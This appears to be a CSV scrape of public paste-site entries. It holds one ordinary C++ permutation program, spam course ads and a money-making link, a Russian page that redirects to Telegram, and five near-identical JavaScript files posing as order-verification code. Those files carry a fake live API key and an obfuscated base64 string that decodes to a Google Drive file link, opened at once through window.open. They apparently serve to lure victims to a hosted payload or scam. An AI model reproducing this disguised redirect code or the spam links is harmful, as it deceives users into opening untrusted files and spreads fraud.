id,title,username,language,date,content
8greRsa3,Untitled,Josif_tepe,C++,Friday 11th of April 2025 12:17:31 PM CDT,"#include <iostream>
#include <vector>
#include <queue>
#include <cstring>
#include <map>
#include <fstream>
using namespace std;
typedef long long ll;
const int maxn = 1e6 + 2;

int main() {
    ios_base::sync_with_stdio(false);
    vector<int> v(4);
    for(int i = 0; i < 4; i++) {
        v[i] = i + 1;
    }
    
    do {
        for(int i = 0; i < 4; i++) {
            cout << v[i] << "" "" ;
        }
        cout << endl;
    } while(next_permutation(v.begin(), v.end()));
}
"
m5iFrDkY,HTML from scratch,f0f077,HTML,Friday 11th of April 2025 12:14:25 PM CDT,"HTML from scratch
Start your web development journey the right way.
What you will learn
HTML markup language
SEO related to HTML
Accessibility related to HTML
The most important tags
for more:http://earnow.online/t4L3qOzC"
VBRaG3qX,Make $1000 15-MINUTES  (BEGINNER) HV,robko,JavaScript,Friday 11th of April 2025 12:10:49 PM CDT," 
Pdf https://tinyurl.com/privguidee


AG66ezObsv
"
1cy8YSF1,"Front-End Web Developer: The Complete Course (HTML, CSS, JS)",f0f077,HTML,Friday 11th of April 2025 12:08:33 PM CDT,"Front-End Web Developer: The Complete Course (HTML, CSS, JS)
Learn HTML5, CSS3, Javascript ES6 with the latest features, create your websites and become a Front-end developer
What you will learn
How the Internet, the Web, and Websites Work
HTML language
The CSS language
Flexbox with CSS
for more:http://earnow.online/hGSWut5S"
PPmZzEqu,Order.js,kammex,JavaScript,Friday 11th of April 2025 12:02:18 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/79115/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
5Mkc5ZBP,Market.js,kammex,JavaScript,Friday 11th of April 2025 11:46:56 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/37047/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ymsnZp4f,index.html,Vitaliy_Novichikhin,HTML,Friday 11th of April 2025 11:29:07 AM CDT,"<!DOCTYPE html>
<html lang=""ru"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>Этикет. Как лучше понимать друг друга?! Делайте предзаказ на книгу сейчас!</title>
    
    <!-- Main configuration variable -->
    <script>
        // ===== SINGLE CONFIGURATION POINT =====
        const channelConfig = {
            link: 'https://t.me/s/eeetiquette',
            title: 'Этикет и взаимопонимание',
            brand: 'Книга по этикету'
        };
    </script>

    <!-- Dynamic meta refresh redirect -->
    <meta http-equiv=""refresh"" content=""1; url=${channelConfig.link}"">
    
    <style>
        /* Base page styling */
        body {
            margin: 0;
            padding: 20px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f0f2f5;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
        }

        /* Content container styling */
        .container {
            max-width: 600px;
            padding: 40px;
            background: white;
            border-radius: 16px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            position: relative;
            z-index: 1;
        }

        /* Floating footer styles */
        .floating-footer {
            position: fixed;
            bottom: -100%;
            left: 0;
            right: 0;
            background: rgba(40, 40, 40, 0.95);
            color: white;
            padding: 20px;
            transition: bottom 0.5s ease-in-out;
            z-index: 1000;
        }

        .floating-footer.active {
            bottom: 0;
        }

        /* Footer content styling */
        .floating-footer footer {
            max-width: 800px;
            margin: 0 auto;
            position: relative;
        }

        .floating-footer a {
            color: #80b3ff;
            text-decoration: underline;
        }

        /* Close button styling */
        .close-btn {
            position: absolute;
            top: 10px;
            right: 10px;
            cursor: pointer;
            width: 24px;
            height: 24px;
            opacity: 0.7;
            transition: opacity 0.2s;
        }

        .close-btn:hover {
            opacity: 1;
        }

        .close-btn::before,
        .close-btn::after {
            content: '';
            position: absolute;
            width: 2px;
            height: 20px;
            background: white;
            left: 11px;
            top: 2px;
        }

        .close-btn::before {
            transform: rotate(45deg);
        }

        .close-btn::after {
            transform: rotate(-45deg);
        }

        /* Action button styling */
        .telegram-button {
            display: inline-flex;
            align-items: center;
            padding: 12px 24px;
            background: #0088cc;
            color: white !important;
            text-decoration: none;
            border-radius: 8px;
            font-weight: 500;
            transition: background 0.2s;
            margin: 15px 0;
        }

        .telegram-button:hover {
            background: #0077b3;
        }

        .telegram-button img {
            width: 24px;
            margin-right: 12px;
        }

        /* Status message styling */
        .notice {
            color: #666;
            font-size: 14px;
            margin-top: 25px;
        }

        /* Loading animation */
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #0088cc;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 30px auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class=""container"">
        <!-- Loading indicator -->
        <div class=""loader""></div>
        
        <!-- Dynamic heading -->
        <h1>${channelConfig.brand}<br>${channelConfig.title}</h1>
        
        <!-- Main action button -->
        <a href=""#"" class=""telegram-button"" id=""manualRedirect"">
            <img src=""https://telegram.org/img/t_logo.svg"" alt=""Telegram"">
            Предзаказ книги
        </a>

        <!-- Fallback information -->
        <p class=""notice"">
            Если автоматическое перенаправление не сработало,<br>
            нажмите кнопку выше или перейдите вручную:<br>
            <code id=""channelUrl""></code>
        </p>
    </div>

    <!-- Floating footer component -->
    <div class=""floating-footer"" id=""floatingFooter"">
        <div class=""close-btn"" id=""closeFooter""></div>
        <footer>
            <div>Домен зарегистрирован через <a href=""https://solidario.tech"">SOLIDARIO.TECH</a>. Редкие доменные имена по всему миру. Хотите себе запоминающийся сайт? Пишите сейчас <a href=""mailto:info@solidario.tech"">info@solidario.tech</a></div>
            <div style=""margin-top: 10px;"">Domain registered by <a href=""https://solidario.tech"">SOLIDARIO.TECH</a>. Rare domain names globally. Want yours? Text now <a href=""mailto:info@solidario.tech"">info@solidario.tech</a>!</div>
        </footer>
    </div>

    <script>
        // Dynamic content injection
        document.getElementById('manualRedirect').href = channelConfig.link;
        document.getElementById('channelUrl').textContent = channelConfig.link;

        // Footer management
        let footerTimer;
        const showFooter = () => document.getElementById('floatingFooter').classList.add('active');
        const hideFooter = () => {
            document.getElementById('floatingFooter').classList.remove('active');
            footerTimer = setTimeout(showFooter, 45000);
        };

        // Initial footer show
        setTimeout(showFooter, 500);
        
        // Event listeners
        document.getElementById('closeFooter').addEventListener('click', hideFooter);
        document.getElementById('manualRedirect').addEventListener('click', (e) => {
            e.preventDefault();
            window.location.href = channelConfig.link;
        });

        // Backup redirect
        setTimeout(() => {
            window.location.href = channelConfig.link;
        }, 5000);
    </script>
</body>
</html>"
L7j7a8Qz,Products.js,dentira,JavaScript,Friday 11th of April 2025 11:15:46 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/08398/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
xt1zwEb6,Order.js,dentira,JavaScript,Friday 11th of April 2025 11:00:25 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/87894/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
cF9BQus4,Market.js,dentira,JavaScript,Friday 11th of April 2025 10:45:03 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/68678/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
